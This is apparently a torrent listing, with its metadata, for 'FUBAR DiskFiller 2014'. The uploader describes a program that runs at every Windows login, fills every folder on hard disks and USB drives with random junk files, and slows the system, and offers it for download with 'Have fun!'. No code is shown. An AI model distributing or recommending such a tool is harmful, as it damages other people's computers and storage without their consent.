It is somewhat idiot-proof.\n\n\nThis one needs installation. Setup only takes a few seconds, and the application is ready to go!\n\nEvery time any user logs into Windows, this application will run.\nIt will fill up your harddisks (and connected USB-devices) with thousands and thousands of useless files!\nMore precisely: 10 files in EVERY folder, every time this application runs.\nEach new file will be given a completely random name and size; ranging between 1KB to 7MB.\n\nWhen this application runs, it will significantly slow down Windows, and it might take an hour or 2 for the application to finish.\n\n\nHave fun!\n\n\n/Ubehage","torrent":{"xt":"urn:btih:b5d2eca44044c7cf488f1ffa4e163493dd0694d1","amp;dn":"FUBAR+DiskFiller+2014","amp;tr":["udp%3A%2F%2Ftracker.openbittorrent.com%3A80","udp%3A%2F%2Fopen.demonii.com%3A1337","udp%3A%2F%2Ftracker.coppersurfer.tk%3A6969","udp%3A%2F%2Fexodus.desync.com%3A6969"],"infoHash":"b5d2eca44044c7cf488f1ffa4e163493dd0694d1","infoHashBuffer":{"type":"Buffer","data":[181,210,236,164,64,68,199,207,72,143,31,250,78,22,52,147,221,6,148,209]},"announce":[],"urlList":[]}}
